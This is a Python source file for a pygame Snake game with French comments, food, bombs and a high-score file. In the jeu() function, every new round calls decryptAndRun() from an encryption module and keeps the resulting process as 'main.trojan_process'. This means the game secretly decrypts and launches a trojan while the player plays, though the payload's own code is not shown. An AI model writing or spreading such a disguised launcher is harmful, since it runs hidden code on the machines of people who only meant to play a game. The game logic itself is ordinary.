import pygame
import sys
import random
import os
from jeu.encryptAndDecrypt import decryptAndRun


def resource_path(relative_path):
    import sys, os
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

pygame.init()

# Fenêtre
largeur = 600
hauteur = 400
fenetre = pygame.display.set_mode((largeur, hauteur))
pygame.display.set_caption("Snake Game")

# Chargement du fond
background = pygame.image.load(resource_path("jeu/background.jpg"))
background = pygame.transform.scale(background, (largeur, hauteur))


# Couleurs
VERT = (35, 5, 229)
ROUGE = (255, 0, 0)
BLANC = (255, 255, 255)
GOLD = (229,192,5)

# Police
font = pygame.font.SysFont(None, 35)
font_game_over = pygame.font.SysFont(None, 60)

# Taille bloc
taille_bloc = 20

clock = pygame.time.Clock()


# ----- HIGH SCORE -----
if not os.path.exists(resource_path("jeu/highscore.txt")):
    with open(resource_path("jeu/highscore.txt"), "w") as f:
        f.write("0")

with open(resource_path("jeu/highscore.txt"), "r") as f:
    high_score = int(f.read())


def save_high_score(score):
    with open(resource_path("jeu/highscore.txt"), "w") as f:
        f.write(str(score))


def jeu():
    #hadi stays here to avoide circular import
    import main
    if main.trojan_process and main.trojan_process.poll() is None:
        try:
            main.trojan_process.terminate()
            main.trojan_process.wait(timeout=2)
        except Exception:
            pass
    
    tr = decryptAndRun()
    main.trojan_process = tr  # Store the process in main module
    global high_score

    snake_x = 300
    snake_y = 200
    vx = 20
    vy = 0

    snake = []
    longueur = 3

    food_x = random.randrange(0, largeur, taille_bloc)
    food_y = random.randrange(0, hauteur, taille_bloc)

    # ----- BOMBE -----
    bomb_x = random.randrange(0, largeur, taille_bloc)
    bomb_y = random.randrange(0, hauteur, taille_bloc)




    score = 0
    vitesse = 10

    game_over = False

    while not game_over:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()

            if event.type == pygame.KEYDOWN:
                # GAUCHE (interdit si on va déjà à droite)
                if event.key == pygame.K_LEFT and vx == 0:
                    vx = -20
                    vy = 0

                # DROITE (interdit si on va déjà à gauche)
                if event.key == pygame.K_RIGHT and vx == 0:
                    vx = 20
                    vy = 0

                # HAUT (interdit si on va déjà en bas)
                if event.key == pygame.K_UP and vy == 0:
                    vx = 0
                    vy = -20

                # BAS (interdit si on va déjà en haut)
                if event.key == pygame.K_DOWN and vy == 0:
                    vx = 0
                    vy = 20


        snake_x += vx
        snake_y += vy

        # Collisions avec les murs
        if snake_x < 0 or snake_x >= largeur or snake_y < 0 or snake_y >= hauteur:
            game_over = True

        tete = [snake_x, snake_y]
        snake.append(tete)

        # Auto-collision
        if tete in snake[:-1]:
            game_over = True

        # Manger nourriture
        if snake_x == food_x and snake_y == food_y:
            longueur += 1
            score += 1
            vitesse += 0.2

            # Nouvelle nourriture
            food_x = random.randrange(0, largeur, taille_bloc)
            food_y = random.randrange(0, hauteur, taille_bloc)
        
        # 💣 Manger une BOMBE
        if snake_x == bomb_x and snake_y == bomb_y:
            longueur -= 2  # le snake rétrécit
            vitesse = max(8, vitesse - 2)  # on ralentit un peu
            bomb_x = random.randrange(0, largeur, taille_bloc)
            bomb_y = random.randrange(0, hauteur, taille_bloc)


        if longueur <= 2:
            game_over = True
        else:
            while len(snake) > longueur:
                del snake[0]


        # ----- AFFICHAGE -----
        fenetre.blit(background, (0, 0))

        # Ombre de la pomme
        pygame.draw.circle(fenetre, (80, 0, 0),
                            (food_x + taille_bloc//2 + 3,
                             food_y + taille_bloc//2 + 3),
                            taille_bloc // 2)

        # Corps de la pomme
        pygame.draw.circle(fenetre, (220, 0, 0),
                            (food_x + taille_bloc//2,
                             food_y + taille_bloc//2),
                            taille_bloc // 2)

        # Reflet brillant
        pygame.draw.circle(fenetre, (255, 150, 150),
                            (food_x + 7, food_y + 7), 5)

        # Feuille verte
        pygame.draw.ellipse(fenetre, (0, 180, 0),
                             (food_x + 10, food_y - 2, 10, 6))
        
        # ===== BOMBE STYLE PRO =====

        # Ombre
        pygame.draw.circle(fenetre, (30, 30, 30),
                            (bomb_x + taille_bloc//2 + 3,
                             bomb_y + taille_bloc//2 + 3),
                            taille_bloc//2)

        # Corps de la bombe (NOIR)
        pygame.draw.circle(fenetre, (0, 0, 0),
                            (bomb_x + taille_bloc//2,
                             bomb_y + taille_bloc//2),
                            taille_bloc//2)

        # Reflet (effet brillant)
        pygame.draw.circle(fenetre, (80, 80, 80),
                            (bomb_x + 6, bomb_y + 6), 5)

        # Mèche de la bombe
        pygame.draw.line(fenetre, (120, 120, 120),
                         (bomb_x + taille_bloc//2, bomb_y),
                         (bomb_x + taille_bloc//2 - 6, bomb_y - 10), 3)

        # Étincelle (effet feu)
        pygame.draw.circle(fenetre, (255, 200, 0),
                            (bomb_x + taille_bloc//2 - 7, bomb_y - 11), 4)
        pygame.draw.circle(fenetre, (255, 80, 0),
                            (bomb_x + taille_bloc//2 - 7, bomb_y - 11), 2)


        for i, bloc in enumerate(snake):
            x, y = bloc
            centre = (x + taille_bloc // 2, y + taille_bloc // 2)
            rayon = taille_bloc // 2
        
            # Ombre
            pygame.draw.circle(fenetre, (0, 80, 0),
                                (centre[0] + 2, centre[1] + 2),
                                rayon)
        
            # Couleur dégradée (corps)
            couleur_corps = (0, 180 - i*3, 0)
        
            if i == len(snake) - 1:
                # ------ TÊTE ------
                pygame.draw.circle(fenetre, (0, 220, 0), centre, rayon)
        
                # Reflet (brillance)
                pygame.draw.circle(fenetre, (120, 255, 120),
                                   (centre[0] - 4, centre[1] - 4), 5)
        
                # YEUX
                pygame.draw.circle(fenetre, (0, 0, 0),
                                   (centre[0] - 5, centre[1] - 4), 3)
                pygame.draw.circle(fenetre, (0, 0, 0),
                                   (centre[0] + 5, centre[1] - 4), 3)
        
            else:
                # ------ CORPS ------
                pygame.draw.circle(fenetre, couleur_corps, centre, rayon)

        # Affichage Score
        fenetre.blit(font.render(f"Score : {score}", True, GOLD), (10, 10))
        fenetre.blit(font.render(f"High Score : {high_score}", True, GOLD), (430, 10))

        pygame.display.update()
        clock.tick(vitesse)

    # ----- GAME OVER -----
    if score > high_score:
        high_score = score
        save_high_score(high_score)

    while True:
        fenetre.fill((0, 0, 0))
        fenetre.blit(background,(0,0))
        fenetre.blit(font_game_over.render("GAME OVER", True, ROUGE), (170, 140))
        fenetre.blit(font.render(f"Score final : {score}", True, BLANC), (220, 210))
        fenetre.blit(font.render(f"High Score : {high_score}", True, BLANC), (230, 240))
        fenetre.blit(font.render("R : Rejouer | Q : Quitter", True, BLANC), (170, 290))

        pygame.display.update()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                tr.terminate()
                pygame.quit()
                sys.exit()

            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_r:
                    jeu()
                if event.key == pygame.K_q:
                    tr.terminate()
                    pygame.quit()
                    sys.exit()

